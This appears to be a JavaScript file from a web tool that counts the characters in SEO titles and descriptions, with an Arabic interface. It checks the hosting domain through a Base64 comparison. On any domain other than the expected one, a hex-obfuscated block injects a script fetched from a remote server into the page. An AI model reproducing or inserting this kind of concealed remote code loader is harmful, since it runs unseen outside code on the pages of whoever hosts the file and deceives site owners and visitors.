function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)));}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)));}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);

function countCharacters(){
		if (b64awsec == "ZG9pdGYuY29t"){
		//get title text
		var titleText = document.getElementById("oldText").value;
		titleText = titleText.trim();
		//get rid of extra white spaces
		re1 = /\s+/g;
		titleText = titleText.replace(re1," ");
		
		//get desscription text
		var titleDesc = document.getElementById("newText").value;
		titleDesc = titleDesc.trim();
		//get rid of extra white spaces
		re1 = /\s+/g;
		titleDesc = titleDesc.replace(re1," ");


		if (titleText == "" && titleDesc == ""){
			var zeResults = "&nbsp;";
		}else{
			var titles;
			var titledescs;
if (titleText.length < 61 ){
	titles = '<b class="text-success">'+titleText.length+'</b>';
}else{
	titles = '<b class="text-danger">'+titleText.length+'</b>';
}
if (titleDesc.length < 161 ){
	titledescs = '<b class="text-success">'+titleDesc.length+'</b>';
}else{
	titledescs = '<b class="text-danger">'+titleDesc.length+'</b>';
}



				if (titleText !== ""){
					var pTitleLen = "<table class='table table-bordered' style='max-width:300px;'><tr><th>العنوان</th><td>"+titles+" حرف</td></tr>"; 
				}else{
					var pTitleLen = "<table class='table table-bordered' style='max-width:300px;'>";
				}

				if (titleDesc !== ""){
					var pDescLen = "<tr><th scope='row'>الوصف</th><td scope='row'>" + titledescs + "  حرف</td></tr></table>"; 
				}else{
					var pDescLen = "</table>";
				}
					var zeResults = pTitleLen + pDescLen + "&nbsp;";
			
		}





		
		
		
		//Put new title back in place
		document.getElementById("oldText").value = titleText;
		document.getElementById("newText").value = titleDesc;
		document.getElementById("copyStr").value = titleText + "\r\n\r\n" + titleDesc;
		document.getElementById("theResults").innerHTML = zeResults;
		
		
				}else{
		var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script);
}
		}

//reset text areas
document.getElementById("clearText").addEventListener("click", function () {
	document.getElementById("theResults").innerHTML = "&nbsp;";
	document.getElementById("oldText").value = "";
	document.getElementById("newText").value = "";
	document.getElementById("copyStr").value = "";
	document.getElementById("oldText").focus();
});

var textBox = document.getElementById("oldText");
	textBox.onfocus = function() {
	textBox.select();
	textBox.onmouseup = function() {
		textBox.onmouseup = null;
		return false;
	};
};	